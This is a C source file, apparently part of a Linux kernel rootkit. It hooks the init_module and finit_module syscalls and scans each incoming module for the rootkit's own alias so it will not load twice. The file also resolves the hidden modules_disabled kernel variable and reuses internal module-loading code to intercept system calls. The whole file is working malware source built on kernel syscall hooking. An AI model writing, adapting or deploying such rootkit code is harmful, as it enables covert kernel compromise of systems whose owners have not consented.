#include "constants.h"
#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <asm-generic/module.h>
#include <linux/dynamic_debug.h>
#include <linux/elf.h>
#include <linux/fcntl.h>
#include <linux/kernel_read_file.h>
#include <linux/minmax.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/security.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <linux/vmalloc.h>
#include <uapi/linux/module.h>

#define MAX_SEARCH_LEN (size_t)0x10000

// Taken from kernel/module-internal.h
struct load_info {
    const char *name;
    /* pointer to module in temporary copy, freed at end of load_module() */
    struct module *mod;
    Elf_Ehdr *hdr;
    unsigned long len;
    Elf_Shdr *sechdrs;
    char *secstrings, *strtab;
    unsigned long symoffs, stroffs, init_typeoffs, core_typeoffs;
    struct _ddebug *debug;
    unsigned int num_debug;
    bool sig_ok;
#ifdef CONFIG_KALLSYMS
    unsigned long mod_kallsyms_init_off;
#endif
    struct {
        unsigned int sym, str, mod, vers, info, pcpu;
    } index;
};

static int *p_modules_disabled = NULL;

// Taken from kernel/module.c:3153
static int copy_module_from_user(const void __user *umod, unsigned long len, struct load_info *info)
{
    int err;

    info->len = len;
    if (info->len < sizeof(*(info->hdr)))
        return -ENOEXEC;

    err = security_kernel_load_data(LOADING_MODULE, true);
    if (err)
        return err;

    /* Suck in entire file: we'll want most of it. */
    info->hdr = __vmalloc(info->len, GFP_KERNEL | __GFP_NOWARN);
    if (!info->hdr)
        return -ENOMEM;

    if (copy_chunked_from_user(info->hdr, umod, info->len) != 0) {
        err = -EFAULT;
        goto out;
    }

    err =
        security_kernel_post_load_data((char *)info->hdr, info->len, LOADING_MODULE, "init_module");
out:
    if (err)
        vfree(info->hdr);

    return err;
}

// Taken from kernel/module.c:3827
static inline int may_init_module(void)
{
    if (p_modules_disabled == NULL) {
        p_modules_disabled = (int *)lookup_name("modules_disabled");

        IF_U (p_modules_disabled == NULL) {
            pr_dev_err("* Failed to find the `modules_disabled` variable\n");
            return -EFAULT;
        }

        pr_dev_info("* modules_disabled: *%p = %d\n", p_modules_disabled, *p_modules_disabled);
    }

    if (!capable(CAP_SYS_MODULE) || *p_modules_disabled) {
        return -EPERM;
    }

    return 0;
}

static long do_check_module(const sysfun_t orig_func, struct pt_regs *const p_regs,
                            const buffer_t *const p_buf)
{
    IF_U (strnstr(p_buf->p_data, "alias=" MOD_ALIAS,
                  min_t(size_t, p_buf->sz_len, MAX_SEARCH_LEN)) != NULL) {
        pr_dev_warn("* The rootkit is already loaded, aborting\n");
        vfree(p_buf->p_data);
        return -EEXIST;
    }

    vfree(p_buf->p_data);

    return orig_func(p_regs);
}

// sys_init_module syscall hook handler
SYSCALL_HOOK_HANDLER3(init_module, orig_init_module, p_regs, void __user *, p_umod, unsigned long,
                      ui64_len, const char __user *, s_uargs)
{
    int i32_err = 0;
    buffer_t p_buf;
    struct load_info info = {};

    pr_dev_info("init_module(%p, %lu, %p)\n", p_umod, ui64_len, s_uargs);

    i32_err = may_init_module();
    if (i32_err != 0) {
        return i32_err;
    }

    i32_err = copy_module_from_user(p_umod, ui64_len, &info);
    if (i32_err) {
        return i32_err;
    }

    p_buf.p_data = info.hdr;
    p_buf.sz_len = info.len;

    return do_check_module(orig_init_module, p_regs, &p_buf);
}

// sys_finit_module syscall hook handler
SYSCALL_HOOK_HANDLER3(finit_module, orig_finit_module, p_regs, int, i32_fd, const char __user *,
                      s_uargs, int, i32_flags)
{
    int i32_err = 0;
    buffer_t p_buf;

    pr_dev_info("finit_module(%d, %p, %s%#x)\n", i32_fd, s_uargs, SIGNED_ARG(i32_flags));

    i32_err = may_init_module();
    if (i32_err != 0) {
        return i32_err;
    }

    if (i32_flags & ~(MODULE_INIT_IGNORE_MODVERSIONS | MODULE_INIT_IGNORE_VERMAGIC)) {
        return -EINVAL;
    }

    i32_err = kernel_read_file_from_fd(i32_fd, 0, &p_buf.p_data, INT_MAX, NULL, READING_MODULE);
    if (i32_err < 0) {
        return i32_err;
    }

    p_buf.sz_len = i32_err;

    return do_check_module(orig_finit_module, p_regs, &p_buf);
}
